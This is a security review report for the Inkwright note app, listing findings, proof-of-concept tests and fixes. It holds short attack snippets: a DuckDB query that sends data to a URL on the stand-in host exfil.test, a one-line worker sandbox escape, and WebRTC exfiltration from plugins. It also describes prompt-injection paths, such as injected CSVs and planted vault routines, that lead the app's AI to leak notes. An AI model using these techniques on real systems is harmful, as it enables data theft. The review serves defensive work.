# Security review, November 2026

| | |
|---|---|
| Date | 2026-11-02 |
| Commit reviewed | `27ee5f7` (main, before the fixes); fixes on top of it |
| Reviewer | independent review, outside the feature teams, from the code (docs were read as claims to check, not as facts) |
| Method | threat model → code review of every path that handles untrusted input or secrets → a proof-of-concept test for each exploitable finding, run against the unfixed code and failing there → the fix → the same test passing |
| Result | 12 findings fixed (1 high, 8 medium, 3 low); 10 accepted, with the risk stated (1 medium, 6 low, 3 informational). No critical findings |

Severity is the reviewer's judgement of impact on Inkwright's users, with a CVSS 3.1 base score as
a guide. Where they differ the reason is given. Every fixed finding has a regression test that
contains the attack; the table names it.

## Scope

In scope, and read in full or in the parts that handle untrusted data:

- **Web app** (`apps/web`): the Content Security Policy (`vite.config.ts`), every HTML sink
  (`dangerouslySetInnerHTML`, `innerHTML`, `srcdoc`, URL attributes), Markdown in the assistant
  panel, imports (PDF, Obsidian vaults and backup ZIPs, BibTeX, CSV/XLSX, agent session
  transcripts, images, SVG), the plugin sandbox (`src/plugins`, `packages/plugin-api`), the
  `window.inkwright` automation API, links (`inkwright://`, `web+inkwright`, `?action=`), the
  Web Share Target, the assistant panel and its tools, secret storage, runbook `http`/`sql`/`js`
  blocks, the data sandbox, photo import, the Google and MCP OAuth flows.
- **MCP / A2A / REST server** (`apps/mcp-server`): the three auth modes, DNS rebinding, CORS,
  vault path handling and symlinks, API key storage and comparison, webhooks (SSRF, signatures),
  rate limits, idempotency, body limits, the signalling relay, the runner, `inkwright scan` over a
  hostile repository, session-transcript import.
- **Peer sync and live collaboration** (`packages/sync/src/peer`, `apps/web/src/peer`): handshake,
  key schedule, nonces, replay, downgrade, view-only guests, what a paired device can do, QR and
  pasted code parsing.
- **Android** (`apps/web/android`): manifest, exported components and intent filters, WebView
  settings, the native plugin's methods, FileProvider paths, backup rules.
- **Supply chain**: `npm audit`, GitHub Actions pinning and permissions, the release workflow's
  handling of signing secrets, scripts loaded from CDNs.

Out of scope: the AI providers and MCP servers a user connects, the browsers and Android itself,
and the cryptographic primitives (WebCrypto, AES-GCM, X25519, HKDF).

## Threat model

### Assets

| Asset | Where it lives |
|---|---|
| Note contents (ink, typed text, recognised handwriting, recordings, PDFs) | the vault: IndexedDB on web/Android, a folder for the server; synced to Drive/WebDAV/folder/paired devices |
| Locked notes | encrypted in the vault; plaintext only while open |
| AI provider keys, MCP OAuth tokens, the relay token | `WebCryptoSecretStore`: AES-GCM ciphertexts plus a non-extractable key, both in IndexedDB; on the server, environment variables / a `0600` config file |
| Device identity (peer link) and authorship signing keys | non-extractable WebCrypto keys in IndexedDB |
| Server credentials: API key hashes (`api/keys.json`, in the vault), webhook secrets (server state dir), the MCP token | as stated |
| Configuration that decides what runs and what leaves: installed plugins and their grants, the AI policy, routines | the vault (`plugins/`, `ai/`) |
| The audit trail and authorship certificates | the vault (`ai/audit/`), signed |
| The release signing key | GitHub Actions secrets |

### Actors

1. **A remote attacker with no access** — reaches a hosted web app, an exposed MCP server, or the
   user through content (a web page, a link, a shared file).
2. **An author of content the user imports** — a PDF, a CSV, an Obsidian vault, a "backup" ZIP, a
   BibTeX file, a repository to scan, a session transcript, a web page added as a source. Their
   text also reaches the AI, so this actor includes **prompt injection**.
3. **A plugin author** — code the user chose to install, running in the sandbox.
4. **Whoever can write the vault without being the user at this device** — the sync remote (a
   shared or compromised Drive folder, the WebDAV operator), a paired device, a live-session guest
   with write access (one note only).
5. **A token holder** — an MCP/API client with a token, an API key or an OAuth token; a device
   holding the relay token.
6. **Another app on the same Android phone**, without special permissions.
7. **The supply chain** — npm packages, GitHub Actions, CDN scripts.

Not modelled: an attacker with the unlocked device or a copy of the browser profile (treated as a
compromised device, SECURITY.md), and malicious AI providers (the user chooses them; the trust
layer limits what is sent, docs/TRUST.md).

### Trust boundaries

```
 untrusted content ──► importers / AI context ──► app origin (vault, keys, DOM) ──► AI provider (policy, firewall)
                                                     │        ▲
 plugin code ──► sandboxed iframe (opaque origin) ──►│ postMessage, permission-checked dispatcher
 runbook js  ──► same-origin Worker with the network and storage removed
 data SQL    ──► DuckDB-WASM worker (same origin)
 the vault's writers ──► sync / peer link / ZIP restore ──► vault files ──► config the app obeys
 network clients ──► MCP/A2A/REST (Host/Origin, token, OAuth, scopes) ──► NodeFS (vault root)
 other Android apps ──► exported MainActivity (VIEW/SEND intents, inkwright:// links)
 CI ──► Actions + npm install scripts ──► signing secrets, release write token
```

The two boundaries this review found weakest were **the vault as configuration** (whoever writes
the vault decides which plugin code runs: SR-01) and **in-origin sandboxes** (the runbook worker
and the DuckDB worker share the app's origin and its network: SR-02, SR-05). Both are fixed; the
remaining parts of the first are residual risk SR-13.

## Findings

| ID | Finding | Severity | CVSS 3.1 (base) | Status | Regression test |
|---|---|---|---|---|---|
| SR-01 | Plugins and their grants came from the vault: a sync remote, paired device or restored backup could install a plugin with `network` + `notes:read` that ran on the next start | **High** | 7.6 `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` | Fixed | `e2e/security.spec.ts` SR-01; `src/plugins/consent.test.ts` |
| SR-02 | Data sandbox: `FROM 'https://…'` and `"read_csv"(…)` passed the read-only filter and DuckDB fetched the URL from its worker (exfiltration by prompt-injected SQL; remote content pulled in) | Medium | 6.1 `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N` | Fixed | `e2e/security.spec.ts` SR-02; `src/datasandbox/engine.duckdb.test.ts` |
| SR-03 | Android allowed cloud backup with no rules: WebView storage — encrypted API keys *and* the key that decrypts them — could go to Google Drive | Medium (raised: breaks a stated product requirement) | 4.4 `AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N` | Fixed | `src/platform/android-manifest.test.ts` |
| SR-04 | Plugin note scope and locked notes ignored by `editor.current/selection/insertText`, `ui.openNote` and the `note.opened` / `selection.changed` events | Medium | 4.6 `AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N` | Fixed | `src/plugins/dispatcher.test.ts` |
| SR-05 | Runbook `js` sandbox: `WorkerNavigator.prototype` still had the `storage` getter, giving the block the origin private file system (on-device AI models) | Medium | 5.4 `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L` | Fixed | `e2e/security.spec.ts` SR-05 |
| SR-06 | Signalling relay memory unbounded in total (≈1.4 GB from one token holder) | Medium | 6.5 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` | Fixed | `test/signal.test.ts` |
| SR-09 | CI: actions on moving tags; release job ran install scripts and Gradle with a persisted `contents: write` token and the keystore on disk; tag text pasted into shell | Medium | — (supply chain) | Fixed | `security.yml` › "Actions are pinned to commit SHAs" fails on any unpinned `uses:` |
| SR-10 | Restoring a backup ZIP wrote `api/keys.json` from the archive: a crafted "backup" adds an admin API key the sender holds | Medium | 6.8 `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` | Fixed | `packages/sync/test/zip.test.ts` |
| SR-12 | Plugins without `network` could open WebRTC connections (`connect-src` doesn't cover them) | Medium | 6.5 `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` | Fixed | `e2e/security.spec.ts` SR-12 |
| SR-07 | `/mcp` buffered up to 4 MiB of an anonymous request before checking credentials | Low | 5.3 if exposed; loopback by default | Fixed | `test/trust.test.ts` |
| SR-08 | `NodeFS.stat` followed symlinks out of the vault (size and mtime of any file) | Low | 3.1 | Fixed | `test/trust.test.ts` |
| SR-11 | Android "Open with"/"Share" read `file://` URIs with the app's own rights (another app could have Inkwright import its private files) | Low | 3.3 `AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` | Fixed (Kotlin not compiled in this review) | `src/platform/android-manifest.test.ts` (intent filter) |
| SR-13 | Anything that can write the vault is trusted with the AI policy, routines and (via sync) API key records; a paired device driving a sync has no server-side mass-delete stop | Medium | — (design) | Accepted, documented | — |
| SR-14 | Links (`?action=new`, `inkwright://new`) and the Web Share Target create notes without a confirmation (drive-by content, can start `note-saved` routines) | Low | 3.5 | Accepted | — |
| SR-15 | CSP: `connect-src *` (any XSS could send data anywhere), `'unsafe-inline'` scripts in native builds, no CSP in the single-file build, no `frame-ancestors` on static hosting | Low (no XSS found) | — (hardening) | Accepted, recommendations below | — |
| SR-16 | Webhooks may target https hosts on the server's private network (blind SSRF by `webhooks`-scope clients) | Low | 3.5 | Accepted, documented in ENTERPRISE.md | — |
| SR-17 | Links in assistant replies can carry note text in their URL (a click sends it) | Low | 3.1 | Accepted | — |
| SR-18 | MCP token accepted as `?token=` (ends up in proxy and tunnel logs) | Low | — | Accepted (documented, needed by some connectors) | — |
| SR-19 | Plugin frames can still cause DNS lookups (`<link rel="dns-prefetch">`), a low-bandwidth channel no CSP governs | Low | — | Accepted | — |
| SR-20 | "Non-extractable" keys are in IndexedDB's files; docs claimed a storage dump could not reveal them | Info | — | Docs corrected | — |
| SR-21 | `window.inkwright` permissions are advisory against scripts in the page (they share the origin) | Info | — | Accepted (by design) | — |
| SR-22 | `npm audit`: 4 moderate advisories, all in `@capacitor/cli`'s `glob`/`minimatch`/`rimraf` (build tool, not shipped) | Info | — | Accepted | `npm run audit:deps` gates high/critical in shipped code |

No critical findings. No XSS was found: React escapes text everywhere, the only HTML sinks are
DOMPurify-sanitised Markdown with images, SVG, frames, forms and styles forbidden (assistant
panel) and an escaping citation formatter (bibliography); exporters escape every attribute.

## Details of fixed findings

### SR-01 — Plugin code and grants came from the vault (High, fixed)

*What.* `plugins/plugins.json` holds each plugin's `granted` permissions and `plugins/<id>/` its
code; both sync. `reloadPlugins()` ran every enabled plugin whose manifest validated, with those
grants, and `activation: "startup"` plugins started at once. Anyone who can write the vault —
a shared Drive folder, the WebDAV operator, a paired device, or a backup ZIP sent to the user
(*Restore backup* merges every file it does not already have) — could add a plugin granted
`network` and `notes:read` and read every note on every device.

*Proof.* `e2e/security.spec.ts` › SR-01 writes a startup plugin into the vault the way a sync
would and reloads; on the unfixed code the plugin ran (its storage write appeared).

*Fix.* `apps/web/src/plugins/consent.ts`: each device keeps, outside the vault, a SHA-256 of the
manifest and entry script and the permissions approved *there*. A plugin runs only while the
vault's files match and `granted` asks for nothing more. Installing, updating and granting in
Settings on this device record consent; a plugin added or changed elsewhere shows **Review**
(a prompt listing what it asks for). Updating a plugin that is waiting for review keeps only the
locally approved grants. Revoking anywhere needs no review.

### SR-02 — DuckDB fetched URLs from SQL (Medium, fixed)

*What.* `readOnlySql` is a deny-list over a comment- and string-stripped skeleton. DuckDB reads a
file or URL named by a string where a table goes, and calls quoted function names, so
`SELECT * FROM 'https://x/?d=…'` and `"read_csv"('https://…')` passed; DuckDB-WASM then fetched
the URL from its worker under the app's `connect-src *`. The model writing SQL sees the question,
the schemas and three sample rows, so a prompt-injected CSV could have it put data in the URL —
and pull remote rows into an answer. *Data never leaves the device* was the documented promise.

*Proof.* SR-02 in the e2e spec routed `https://exfil.test/**`: the unfixed sandbox fetched it and
showed the remote rows.

*Fix.* The boundary is now DuckDB itself (`DUCKDB_HARDENING` in `datasandbox/engine.ts`):
`allowed_directories` = the registered-dataset folder, `enable_external_access = false`, extension
auto-install/auto-load off, `lock_configuration = true`, applied before any query; if they can't
be applied the engine is refused and SQLite (no file or network access) is used. The filter also
refuses file-as-table, quoted calls, `query()`/`query_table()` and the `read_*`/`*_scan`
families. `engine.duckdb.test.ts` runs the settings against the real DuckDB-WASM build.

### SR-03 — Android cloud backup of keys (Medium, fixed)

*What.* `android:allowBackup="true"` without `dataExtractionRules`/`fullBackupContent`: Auto
Backup copies the app's data directory, including the WebView's IndexedDB, to the user's Google
Drive. The secret store's ciphertexts and its "non-extractable" AES key are in the same files —
non-extractable stops scripts, not file copies — so the backup held API keys in effect in the
clear, plus the peer identity and authorship signing keys (a restore would clone the device).

*Fix.* `allowBackup="false"`, `data_extraction_rules.xml` excluding every domain from cloud
backup (Android 12+ device-to-device transfer to a new phone still moves everything), and
`backup_rules.xml` for Android ≤ 11. A test parses the manifest and rules. The secret store's doc
and COLLABORATION.md/ENTERPRISE.md no longer claim a storage dump can't reveal keys.

### SR-04 — Plugin scope bypass through the editor (Medium, fixed)

*What.* `notes.*` methods hid notes outside a plugin's `noteScope` and locked notes, but
`editor.current()`, `editor.selection()`, `editor.insertText()` and `ui.openNote()` answered for
whatever note was open, and `note.opened`, `selection.changed` (and `note.created` on first open)
were emitted without the note, which the scope check treated as "allowed". A plugin scoped to
`#work` could read the title and selected text of any note, including a locked note while open.

*Fix.* `visibleEditor()` in `dispatcher.ts` makes an out-of-scope or locked open note look like
no open note; `ui.openNote` uses the same visibility check as `notes.get`; the host looks up the
note behind editor events, and a scoped plugin gets no event it cannot be shown to be allowed.

### SR-05 — Runbook `js` blocks reached OPFS (Medium, fixed)

*What.* `js` blocks run as a Worker from a `blob:` URL, i.e. in the app's origin; the prelude
removes network and storage APIs. It shadowed `navigator.storage` on the instance only, so
`Object.getOwnPropertyDescriptor(WorkerNavigator.prototype, 'storage').get.call(navigator)`
returned the origin's StorageManager and `getDirectory()` the origin private file system, where
on-device AI models are stored (readable and replaceable: model tampering). A block arrives with
any note (sync, import, a shared notebook) and runs when its *Run* button is pressed.

*Fix.* The prelude deletes `storage`, `locks` and the device APIs along the `WorkerNavigator`
prototype chain and removes the File System Access and StorageManager interfaces. The e2e test
runs exactly the escape and expects `undefined`.

### SR-06 — Relay memory (Medium, fixed)

`/signal/v1` kept up to 1000 rooms × 16 messages × 64 KiB (base64 in memory: ≈1.4 GB), all
reachable by any holder of the relay token — a token that is handed to collaborators' devices.
The relay now counts bytes and keeps at most 32 MiB (`maxBytes`), dropping the stalest rooms
first and never the one being written.

### SR-07 — Body read before authentication (Low, fixed)

`/mcp` converted the Node request to a web `Request` — reading up to 4 MiB — and only then ran
the auth gate. Credentials are in headers in all three modes, so the gate now runs on a body-less
request first. Anonymous requests are refused without reading their bodies.

### SR-08 — `stat` outside the vault (Low, fixed)

Every `NodeFS` method re-checked containment after following symlinks except `stat`, used for the
API key file and change detection. A symlink in a synced vault revealed size and mtime of any
file the server can stat. `stat` now makes the same check.

### SR-09 — CI and release supply chain (Medium, fixed)

*What.* Third-party actions were referenced by tag (`@v4`), which their owners can move. The
release job ran `npm ci` (install scripts of ~500 packages), Vite and Gradle with
`permissions: contents: write` at workflow level and checkout's persisted credentials in
`.git/config`; the keystore stayed on disk for the rest of the job; and
`${{ steps.v.outputs.version }}` (from the tag name) was pasted into `run:` scripts.

*Fix.* Every action pinned to a commit SHA with the version in a comment (Dependabot keeps them
current, `.github/dependabot.yml`); `persist-credentials: false` on every checkout; top-level
`contents: read` everywhere; the release split into a read-only **build** job and a **publish**
job (`contents: write`) that runs no project code; the tag is validated against a version
pattern and reaches scripts only as environment variables; the keystore is written with
`umask 077` inside the Android step and deleted in an `if: always()` step; Pages deploy
permissions moved to the deploy job. The security workflow fails if any `uses:` is not a
40-hex commit SHA. The Semgrep container is still referenced by tag (`semgrep/semgrep:1.95.0`);
pin it by digest when the registry is reachable from where the pin is made.

### SR-10 — API keys from a backup ZIP (Medium, fixed)

`importVaultZip` merged every archive entry the vault lacked, including `api/keys.json`. A ZIP
sent as "my notes" could add a key record (a hash the sender knows the key for) with `admin`
scope; every `inkwright-mcp` serving that vault with a network listener would then accept the
sender. Archives can no longer bring credentials (`NEVER_IMPORTED`, reported as `skipped`), and
replace mode keeps the vault's own key file.

### SR-11 — Android `file://` intents (Low, fixed; not compiled here)

`IncomingFiles` copied `file://` URIs (VIEW data and SEND streams) with Inkwright's own rights.
Any app could name a file in `/data/data/app.inkwright/` and have it imported as a note (no
direct read-back, but private files moved into the synced vault). The `file` scheme is gone from
the VIEW intent filter; the code accepts only `content://` URIs and not Inkwright's own
FileProvider. The Kotlin change is small and was reviewed by reading only: this review did not
run Gradle (shared build machine). Build and run `testDebugUnitTest` before release.

### SR-12 — WebRTC from plugin frames (Medium, fixed)

`connect-src 'none'` in the plugin frame doesn't cover WebRTC. In Chromium a plugin with no
permissions created an `RTCPeerConnection` with a STUN server of its choosing and an offer
(e2e SR-12 on the unfixed code: `offer made`): ICE gathering contacts that server, so a plugin
granted only `notes:read` could send notes out. The runtime now deletes the WebRTC constructors
before plugin code loads. A nested frame doesn't bring them back: inside the opaque-origin
sandbox every child frame is cross-origin (checked in Chromium during the review).

## Accepted and residual risks

**SR-13 — the vault is configuration (Medium, accepted).** Besides plugins (now gated per
device), the vault carries `ai/policy.json` (routes, privacy firewall, tool denials), routines
(prompts that run on a schedule with the user's AI and tools), skills (instructions to the
assistant) and, through sync, `api/keys.json`. Whoever can write the vault — the sync remote, a
paired device — can loosen the policy, plant a routine or skill (prompt injection with the trust
layer's guards still applying), or add an API key record. And when a paired device drives a sync,
the serving device applies its writes and deletes through `servePeerVault` with no mass-delete
stop of its own (the stop runs on the driving side). This follows from the design (*a paired
device is you*; *the vault is the source of truth*) and is now stated in ENTERPRISE.md. Mitigations
in place: Activity with undo for agent writes, version history for notes, device-local plugin
consent. Recommended next steps are below.

**SR-14 — notes from links and shares (Low).** `?action=new`, `inkwright://new|capture` and a
cross-site form POST to the Web Share Target create a note with attacker text and tags, and open
it. Nothing is read or deleted, but the note joins the AI's context, and a `note-saved` routine
watching one of the tags runs. A confirmation would break automation flows (Shortcuts, Tasker);
recommended: confirm only when the tags match a routine trigger, and mark such notes as external
content for the injection guard.

**SR-15 — CSP hardening (Low).** `connect-src *` is needed for user-chosen AI endpoints; it means
an XSS would be an exfiltration. None was found, and React plus DOMPurify keep the surface small.
Native builds allow `'unsafe-inline'` for Capacitor's bridge; a hash-based policy would remove it.
The single-file preview build has no CSP. GitHub Pages can't send `frame-ancestors`; the Docker
appliance's nginx does (`frame-ancestors 'none'`).

**SR-16 — webhook SSRF (Low).** `https://` webhook URLs may point at private-network hosts. Only
`webhooks`-scope principals can register them, and responses are not returned (blind). Grant
`webhooks` like `admin`; an operator option to refuse private address ranges is recommended.

**SR-17 — links in assistant replies (Low).** Images and remote content are forbidden in replies,
so nothing loads by itself; a link can still carry text in its URL and send it when clicked.
Showing the destination host next to links would make this visible.

**SR-18** (`?token=`) and **SR-19** (DNS prefetch from plugin frames) are low-bandwidth or
documented trade-offs. **SR-21**: `window.inkwright` is a convenience API for scripts that already
share the origin, not a boundary. **SR-22**: dev-only advisories; shipped dependencies have no
known advisories (pdf.js 6.5 with `isEvalSupported: false` everywhere; SheetJS 0.20.3, past the
prototype-pollution and ReDoS fixes).

## Reviewed with no findings

- **MCP/A2A auth.** Loopback mode checks Host and Origin (DNS rebinding; `Origin: null`
  refused); token compare is SHA-256 + `timingSafeEqual`; OAuth verifies signature (JWKS),
  issuer, audience (RFC 8707 resource), expiry and scopes with `jose`; listening off loopback
  without a token or OAuth is refused at start.
- **REST API.** API keys are 256-bit random, stored as SHA-256, compared in constant time; scopes
  per route; CORS only for configured origins (and the loopback gate still requires a loopback
  Origin); bodies limited; idempotency keys per principal.
- **Webhooks.** Standard Webhooks signatures (HMAC-SHA256 over id, timestamp, body), receivers'
  verifier rejects stale timestamps; redirects not followed; secrets outside the vault (`0600`).
- **Vault paths.** Ids validated everywhere; `NodeFS` resolves inside the root and re-checks
  after symlinks (now including `stat`); ZIP entries normalised (`..` refused); `inkwright scan`
  skips symlinks and caps file sizes.
- **Peer link.** Noise-KK-style X25519 handshake with ephemeral keys, the pairing secret and the
  whole transcript (both SDPs) in HKDF; AES-256-GCM per direction with the counter as nonce and
  in the AAD; strictly in-order opening (replay, reorder and drop close the link); one protocol
  version (no negotiation to downgrade); offers expire in 10 minutes and are single-use; codes
  are size- and shape-checked before use; frames and messages size-limited. View-only guests'
  ops and ink are ignored by the host.
- **Plugin sandbox.** `sandbox="allow-scripts"` without `allow-same-origin`; the frame's own CSP;
  messages accepted only from the frame's window and in the versioned protocol; permissions
  checked per call; `net.fetch` limited to manifest hosts (https, or http to loopback), no
  credentials, no redirects, hop-by-hop and cookie headers dropped.
- **OAuth in the app.** MCP sign-in checks `state` and accepts the popup's message only from the
  app's origin; Google sign-in uses the GIS token client (token kept in memory).
- **Imports.** pdf.js without eval; PDF/image/SVG content shown only through `<img>` or canvas;
  web pages added as sources parsed with an inert `DOMParser`; session transcripts and BibTeX
  become text, never HTML.
- **Android.** Only the launcher activity is exported; the FileProvider is not; no cleartext
  traffic; WebView debugging follows the build type (Capacitor default); the native plugin's
  methods take plain values (no paths or URLs from the web layer reach the file system except
  through Capacitor's own Filesystem plugin).

## Recommendations

1. Treat vault-held configuration like plugins (SR-13): sign or device-approve `ai/policy.json`
   loosening changes and new routines, as SR-01 now does for plugins; keep server-accepted API
   keys in the server's state directory rather than the synced vault, or require a server-side
   confirmation for keys created elsewhere.
2. Give the serving side of peer sync its own mass-delete stop that asks the person at that
   device.
3. Move runbook `js` blocks and DuckDB into an opaque-origin context (a sandboxed iframe hosting
   the worker), so a future escape from either lands outside the app's origin.
4. A hash-based CSP for native builds; `frame-ancestors` (or a frame-busting check) for hosted
   builds; a CSP for the single-file preview.
5. Show link destinations in assistant replies; an operator option to refuse private address
   ranges for webhooks.
6. Run the Android unit tests and a release build in CI on every change to `apps/web/android`
   (SR-11 was reviewed but not compiled here).
7. Keep `e2e/security.spec.ts` in the default e2e run: each test is an attack.
